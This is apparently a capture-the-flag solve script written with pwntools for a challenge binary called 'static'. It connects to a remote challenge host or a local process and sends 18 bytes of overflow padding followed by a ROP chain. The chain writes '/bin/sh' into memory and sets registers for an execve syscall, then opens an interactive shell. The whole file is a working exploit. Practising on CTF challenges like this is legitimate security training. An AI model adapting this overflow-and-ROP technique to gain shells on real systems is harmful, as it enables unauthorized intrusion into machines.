from pwn import *


binary = "src/static"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break *vuln+32
continue
"""

if args.REMOTE:
    p = remote("static.chal.cyberjousting.com", 1350)
elif args.REMOTE2:
    p = remote("localhost", 1350)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


### form ROP chain for execve("/bin/sh", NULL, NULL) ###
# padding
payload = b'A' * 18


# put "/bin/sh" into $rdi, put writable addr into $rax, put /bin/sh at writable addr, then put addr into $rdi
payload += p64(0x401fe0)            # pop rdi; ret
payload += p64(0x68732f6e69622f)    # /bin/sh

payload += p64(0x41069c)            # pop rax; ret
payload += p64(0x4a0000)            # address for /bin/sh

payload += p64(0x46718c)            # mov qword ptr [rax], rdi; pop rbx; ret;
payload += p64(0x0)                 # filler for rbx

payload += p64(0x401fe0)            # pop rdi; ret
payload += p64(0x4a0000)            # address for /bin/sh


# $rdx = 0
payload += p64(0x44baf2)            # xor edx, edx; mov eax, edx; ret;


# $rsi = 0
payload += p64(0x42f6b8)            # xor esi, esi; pop rbx; mov rax, rsi; ret;
payload += p64(0x0)                 # filler for rbx


# $rax = 59
payload += p64(0x41069c)            # pop rax; ret
payload += p64(0x3b)                # 0x3b


# syscall
payload += p64(0x401194)            # syscall

p.sendline(payload)

p.interactive()